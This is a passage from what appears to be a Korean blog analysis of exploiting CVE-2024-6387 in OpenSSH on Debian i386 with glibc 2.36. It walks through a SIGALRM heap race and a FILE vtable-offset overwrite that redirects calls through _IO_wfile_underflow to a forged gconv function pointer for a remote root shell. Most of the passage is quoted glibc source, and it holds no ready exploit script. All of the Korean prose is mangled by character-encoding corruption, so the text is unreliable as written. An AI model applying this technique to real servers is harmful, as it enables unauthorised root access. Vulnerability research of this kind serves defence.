í•´ë‹¹ ë²„ì „ì˜ ì—°êµ¬ì—ì„  `syslog`ë¥¼ í˜¸ì¶œí•˜ëŠ” ì ì„ ì´ìš©í•©ë‹ˆë‹¤. PoCì—ì„  í˜„ì¬ í™˜ê²½ì—ì„œì˜ ì·¨ì•½ì„±ì„ ì¢…í•©í•´ì„œ ì•…ìš©í•˜ê¸° ë•Œë¬¸ì— ìì„¸íˆ ì•Œì•„ë´…ì‹œë‹¤.

ì—°êµ¬ì— ì‚¬ìš©ëœ `Debian`ì€ i386ì— ê²½ìš° glibc(2.36)ê°€ í•­ìƒ `0xb7200000` ë˜ëŠ” `0xb7400000`ì— ë§¤í•‘ë˜ê¸° ë•Œë¬¸ì— ì ˆë°˜ì˜ í™•ë¥ ë¡œ PIEë¥¼ ë¬´ë ¥í™” ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•ì„œ ì•Œì•„ë³¸ ìˆœì„œë¡œ `syslog`ê°€ `grace_alarm_handler`ì— ì˜í•´ì„œ í˜¸ì¶œë©ë‹ˆë‹¤. 

ì—°êµ¬ì— ì‚¬ìš©ëœ `Debian`ë²„ì „ì˜ glibc(2.36)ëŠ” <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=a15d53e2de4c7d83bda251469d92a3c7b49a90db">ë‹¨ì¼ ìŠ¤ë ˆë“œ í™˜ê²½ì—ëŒ€í•œ ë½ì„ ì§„í–‰í•˜ì§€ ì•Šê¸° ë•Œë¬¸</a>ì— ì·¨ì•½ì ì„ ì„±ê³µì ìœ¼ë¡œ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ì´ìš©í•´ `malloc` í˜¸ì¶œì„ SIGALRMì„ í†µí•´ ì¤‘ê°„ì— ì¤‘ë‹¨ì‹œí‚¨ í›„ `SIGALRM`ì—ì„œ ì‚¬ìš©í•˜ëŠ” `malloc`ì„ í†µí•´ ì™„ì „íˆ ì²˜ë¦¬ë˜ì§€ ì•Šì€ `heap chunk`ë¥¼ ì•…ìš©í•©ë‹ˆë‹¤.

í•´ë‹¹ ê³µê²©ì„ ì„±ê³µì‹œí‚¤ìœ„í•´ 120ì´ˆì˜ ë¡œê·¸ì¸ ìœ ì˜ˆ ì‹œê°„ ë™ì•ˆ 100ê°œì˜ ì—°ê²°(MaxStartups)ì„ ìˆ˜ìš©í•  ê²½ìš° ì›ê²© ë£¨íŠ¸ ì‰˜ì„ ì–»ê¸° ìœ„í•´ ì•½ 6~8ì‹œê°„ì´ ì†Œìš”ë©ë‹ˆë‹¤.

glibc 2.36ì—ì„œ `syslog`ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ íë¦„ìœ¼ë¡œ `fopen`ì„ í˜¸ì¶œí•´ `FILE` êµ¬ì¡°ì²´ë¥¼ ë§Œë“¤ê³  ìˆìŠµë‹ˆë‹¤.
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph.png"/></p>

<details>
<summary>/misc/syslog.c:__syslog,__vsyslog_internal</summary>
<div markdown="1">
```c
/*
 * syslog, vsyslog --
 *	print message on log file; output is intended for syslogd(8).
 */
void
__syslog (int pri, const char *fmt, ...)
{
  va_list ap;

  va_start (ap, fmt);
  __vsyslog_internal (pri, fmt, ap, 0);
  va_end (ap);
}
ldbl_hidden_def (__syslog, syslog)
ldbl_strong_alias (__syslog, syslog)

void
__vsyslog_internal (int pri, const char *fmt, va_list ap,
		    unsigned int mode_flags)
{
...
  struct tm *now_tmp = __localtime64_r (&now, &now_tm);
...
}
```
</div>
</details>
<details>
<summary>/time/localtime.c:__localtime64_r</summary>
<div markdown="1">
```c
/* Return the `struct tm' representation of *T in local time,
   using *TP to store the result.  */
struct tm *
__localtime64_r (const __time64_t *t, struct tm *tp)
{
  return __tz_convert (*t, 1, tp);
}
```
</div>
</details>
<details>
<summary>/time/tzset.c:__tz_convert,tzset_internal</summary>
<div markdown="1">
```c
/* Return the `struct tm' representation of TIMER in the local timezone.
   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */
struct tm *
__tz_convert (__time64_t timer, int use_localtime, struct tm *tp)
{
...
  /* Update internal database according to current TZ setting.
     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.
     This is a good idea since this allows at least a bit more parallelism.  */
  tzset_internal (tp == &_tmbuf && use_localtime);
...
}
...
/* Interpret the TZ envariable.  */
static void
tzset_internal (int always)
{
...
  /* Try to read a data file.  */
  __tzfile_read (tz, 0, NULL);
...
}
```
</div>
</details>
<details>
<summary>/time/tzfile.c:__tzfile_read</summary>
<div markdown="1">
```c
void
__tzfile_read (const char *file, size_t extra, char **extrap)
{
...
  /* Note the file is opened with cancellation in the I/O functions
     disabled and if available FD_CLOEXEC set.  */
  f = fopen (file, "rce");
  if (f == NULL)
    goto ret_free_transitions;
...
 read_again:
  if (__builtin_expect (__fread_unlocked ((void *) &tzhead, sizeof (tzhead),
					  1, f) != 1, 0)
      || memcmp (tzhead.tzh_magic, TZ_MAGIC, sizeof (tzhead.tzh_magic)) != 0)
    goto lose;
}
```
</div>
</details>

ìœ„ì™€ ê°™ì€ íë¦„ì— ì˜í•´ì„œ `FILE` êµ¬ì¡°ì²´ê°€ í™ ë©”ëª¨ë¦¬ì— ìƒì„±ë©ë‹ˆë‹¤.

ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ íŠ¹ì • í™ ì²­í¬ë¥¼ ê²¹ì¹˜ê²Œ ë§Œë“  í›„ ì´ë¥¼ ë®ì–´ì“°ëŠ” ê³¼ì •ìœ¼ë¡œ ê³µê²©ì„ ì§„í–‰í•©ë‹ˆë‹¤.

ë³´ê³ ì„œì— ë‚˜ì˜¨ ë‚´ìš©ì— ë”°ë¥´ë©´ í™ ì†ìƒì„ í†µí•´ `__tzfile_read()`ì—ì„œ í• ë‹¹ëœ `FILE` êµ¬ì¡°ì²´ì˜ `_vtable_offset` í•„ë“œ ë®ì–´ì¨ í•¨ìˆ˜ í¬ì¸í„°ì— ì˜í•´ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë¥¼ ì„ì˜ë¡œ ì¡°ì‘í•˜ì—¬
ì›í•˜ëŠ” ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œë©ë‹ˆë‹¤. 

```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
...
  signed char _vtable_offset;
...
};
```

ì´ë ‡ê²Œ ì˜¤ì—¼ëœ ë©”íƒ€ë°ì´í„°ëŠ” ìœ„ ì½”ë“œì—ì„œ ì‚´í´ë³¸ `__tzfile_read`ì—ì„œ  `__fread_unlocked`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê³¼ì •ì—ì„œ ì›í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.

`__fread_unlocked` í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜¸ì¶œ íë¦„ì„ ê°–ìŠµë‹ˆë‹¤.
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph2.png"/></p>
<details>
<summary>libio/iofread_u.c:_IO_jump_t</summary>
<div markdown="1">
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```
</div>
</details>

<details>
<summary>libio/iofread_u.c:__fread_unlocked</summary>
<div markdown="1">
```c
size_t
__fread_unlocked (void *buf, size_t size, size_t count, FILE *fp)
{
  size_t bytes_requested = size * count;
  size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```
</div>
</details>


<details>
<summary>libio/genops.c:_IO_sgetn</summary>
<div markdown="1">
```c
size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
libc_hidden_def (_IO_sgetn)
```
</div>
</details>

<details>
<summary>libio/libioP.h:_IO_XSGETN(FP, DATA, N), _IO_WXSGETN(FP, DATA, N)</summary>
<div markdown="1">
```c
/* The 'xsgetn' hook reads upto N characters into buffer DATA.
   Returns the number of character actually read.
   It matches the streambuf::xsgetn virtual function. */
typedef size_t (*_IO_xsgetn_t) (FILE *FP, void *DATA, size_t N);
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
#define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)
```
</div>
</details>

<details>
<summary>libio/fileops.c:_IO_file_xsgetn</summary>
<div markdown="1">
```c
size_t
_IO_file_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t want, have;
  ssize_t count;
  char *s = data;

  want = n;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
	{
	  memcpy (s, fp->_IO_read_ptr, want);
	  fp->_IO_read_ptr += want;
	  want = 0;
	}
      else
	{
	  if (have > 0)
	    {
	      s = __mempcpy (s, fp->_IO_read_ptr, have);
	      want -= have;
	      fp->_IO_read_ptr += have;
	    }

	  /* Check for backup and repeat */
	  if (_IO_in_backup (fp))
	    {
	      _IO_switch_to_main_get_area (fp);
	      continue;
	    }

	  /* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */
	  if (fp->_IO_buf_base
	      && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
	    {
	      if (__underflow (fp) == EOF)
		break;

	      continue;
	    }

	  /* These must be set before the sysread as we might longjmp out
	     waiting for input. */
	  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
	  _IO_setp (fp, fp->_IO_buf_base, fp->_IO_buf_base);

	  /* Try to maintain alignment: read a whole number of blocks.  */
	  count = want;
	  if (fp->_IO_buf_base)
	    {
	      size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
	      if (block_size >= 128)
		count -= want % block_size;
	    }

	  count = _IO_SYSREAD (fp, s, count);
	  if (count <= 0)
	    {
	      if (count == 0)
		fp->_flags |= _IO_EOF_SEEN;
	      else
		fp->_flags |= _IO_ERR_SEEN;

	      break;
	    }

	  s += count;
	  want -= count;
	  if (fp->_offset != _IO_pos_BAD)
	    _IO_pos_adjust (fp->_offset, count);
	}
    }

  return n - want;
}
libc_hidden_def (_IO_file_xsgetn)
```
</div>
</details>

<details>
<summary>libio/genops.c</summary>
<div markdown="1">
```c
int
__underflow (FILE *fp)
{
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, -1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF)
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp);
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end))
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  return _IO_UNDERFLOW (fp);
}
libc_hidden_def (__underflow)
```
</div>
</details>

<details>
<summary>libio/libioP.h:_IO_UNDERFLOW(FP),_IO_WUNDERFLOW(FP)</summary>
<div markdown="1">
```c
/* The 'underflow' hook tries to fills the get buffer.
   It returns the next character (as an unsigned char) or EOF.  The next
   character remains in the get buffer, and the get position is not changed.
   It matches the streambuf::underflow virtual function. */
typedef int (*_IO_underflow_t) (FILE *);
#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
#define _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP)
```
</div>
</details>


ì—¬ê¸°ì„œ `_vtable_offset`ë©¤ë²„ë¥¼ ë®ì–´ ì˜¤í”„ì…‹ì— ì˜í•´ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë¥¼ `_IO_file_underflow` ëŒ€ì‹  `_IO_wfile_underflow`ë¥¼ í˜¸ì¶œí•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph3.png"/></p>

<details>
<summary>libio/fileops.c:_IO_file_jumps</summary>
<div markdown="1">
```c
const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)
```
</div>
</details>

<details>
<summary>libio/wfileops.c:_IO_wfile_jumps</summary>
<div markdown="1">
```c
const struct _IO_jump_t _IO_wfile_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)
```
</div>
</details>


<details>
<summary>libio/fileops.c:_IO_new_file_underflow</summary>
<div markdown="1">
```c
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
```
</div>
</details>

<details>
<summary>libio/wfileops.c:_IO_wfile_underflow</summary>
<div markdown="1">
```c
wint_t
_IO_wfile_underflow (FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return WEOF;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
				   fp->_IO_read_ptr, fp->_IO_read_end,
				   &read_stop,
				   fp->_wide_data->_IO_read_ptr,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);

      fp->_IO_read_base = fp->_IO_read_ptr;
      fp->_IO_read_ptr = (char *) read_stop;

      /* If we managed to generate some text return the next character.  */
      if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
	return *fp->_wide_data->_IO_read_ptr;

      if (status == __codecvt_error)
	{
	  __set_errno (EILSEQ);
	  fp->_flags |= _IO_ERR_SEEN;
	  return WEOF;
	}

      /* Move the remaining content of the read buffer to the beginning.  */
      memmove (fp->_IO_buf_base, fp->_IO_read_ptr,
	       fp->_IO_read_end - fp->_IO_read_ptr);
      fp->_IO_read_end = (fp->_IO_buf_base
			  + (fp->_IO_read_end - fp->_IO_read_ptr));
      fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
    }
  else
    fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end =
      fp->_IO_buf_base;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);

      fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end =
	fp->_IO_buf_base;
    }

  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end =
    fp->_IO_buf_base;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
    fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_read_end = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr =
    fp->_wide_data->_IO_write_end = fp->_wide_data->_IO_buf_base;

  const char *read_ptr_copy;
  char accbuf[MB_LEN_MAX];
  size_t naccbuf = 0;
 again:
  count = _IO_SYSREAD (fp, fp->_IO_read_end,
		       fp->_IO_buf_end - fp->_IO_read_end);
  if (count <= 0)
    {
      if (count == 0 && naccbuf == 0)
	{
	  fp->_flags |= _IO_EOF_SEEN;
	  fp->_offset = _IO_pos_BAD;
	}
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
    }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      if (naccbuf != 0)
	/* There are some bytes in the external buffer but they don't
	   convert to anything.  */
	__set_errno (EILSEQ);
      return WEOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);

  /* Now convert the read input.  */
  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
  fp->_IO_read_base = fp->_IO_read_ptr;
  const char *from = fp->_IO_read_ptr;
  const char *to = fp->_IO_read_end;
  size_t to_copy = count;
  if (__glibc_unlikely (naccbuf != 0))
    {
      to_copy = MIN (sizeof (accbuf) - naccbuf, count);
      to = __mempcpy (&accbuf[naccbuf], from, to_copy);
      naccbuf += to_copy;
      from = accbuf;
    }
  status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
			       from, to, &read_ptr_copy,
			       fp->_wide_data->_IO_read_end,
			       fp->_wide_data->_IO_buf_end,
			       &fp->_wide_data->_IO_read_end);

  if (__glibc_unlikely (naccbuf != 0))
    fp->_IO_read_ptr += MAX (0, read_ptr_copy - &accbuf[naccbuf - to_copy]);
  else
    fp->_IO_read_ptr = (char *) read_ptr_copy;
  if (fp->_wide_data->_IO_read_end == fp->_wide_data->_IO_buf_base)
    {
      if (status == __codecvt_error)
	{
	out_eilseq:
	  __set_errno (EILSEQ);
	  fp->_flags |= _IO_ERR_SEEN;
	  return WEOF;
	}

      /* The read bytes make no complete character.  Try reading again.  */
      assert (status == __codecvt_partial);

      if (naccbuf == 0)
	{
	  if (fp->_IO_read_base < fp->_IO_read_ptr)
	    {
	      /* Partially used the buffer for some input data that
		 produces no output.  */
	      size_t avail = fp->_IO_read_end - fp->_IO_read_ptr;
	      memmove (fp->_IO_read_base, fp->_IO_read_ptr, avail);
	      fp->_IO_read_ptr = fp->_IO_read_base;
	      fp->_IO_read_end -= avail;
	      goto again;
	    }
	  naccbuf = fp->_IO_read_end - fp->_IO_read_ptr;
	  if (naccbuf >= sizeof (accbuf))
	    goto out_eilseq;

	  memcpy (accbuf, fp->_IO_read_ptr, naccbuf);
	}
      else
	{
	  size_t used = read_ptr_copy - accbuf;
	  if (used > 0)
	    {
	      memmove (accbuf, read_ptr_copy, naccbuf - used);
	      naccbuf -= used;
	    }

	  if (naccbuf == sizeof (accbuf))
	    goto out_eilseq;
	}

      fp->_IO_read_ptr = fp->_IO_read_end = fp->_IO_read_base;

      goto again;
    }

  return *fp->_wide_data->_IO_read_ptr;
}
libc_hidden_def (_IO_wfile_underflow)
```
</div>
</details>
`_IO_wfile_underflow`ëŠ” ë‹¤ìŒ íë¦„ì„ ê°–ëŠ”ë° ì´ë•Œ `__fct` í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì›í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph4.png"/></p>
<details>
<summary>libio/iofwide.c</summary>
<div markdown="1">
```c
enum __codecvt_result
__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		    const char *from_start, const char *from_end,
		    const char **from_stop,
		    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_in.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_in.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
#ifdef PTR_DEMANGLE
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);
#endif

  status = DL_CALL_FCT (fct,
			(gs, &codecvt->__cd_in.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));

  *from_stop = (const char *) from_start_copy;
  *to_stop = (wchar_t *) codecvt->__cd_in.step_data.__outbuf;

  switch (status)
    {
    case __GCONV_OK:
    case __GCONV_EMPTY_INPUT:
      result = __codecvt_ok;
      break;

    case __GCONV_FULL_OUTPUT:
    case __GCONV_INCOMPLETE_INPUT:
      result = __codecvt_partial;
      break;

    default:
      result = __codecvt_error;
      break;
    }

  return result;
}
```
</div>
</details>


ì—¬ê¸°ì—ì„œ í•¨ìˆ˜ í¬ì¸í„°ë¡œ ì°¸ì¡°ë˜ëŠ” ë©¤ë²„ì˜ êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±ë˜ê²Œë©ë‹ˆë‹¤.

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/structure_graph.png"/></p>

<details>
<summary>libio/libioP.h</summary>
<div markdown="1">
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};

/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```
</div>
</details>

<details>
<summary>libio/bits/types/struct_FILE.h:struct _IO_FILE</summary>
<div markdown="1">
```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
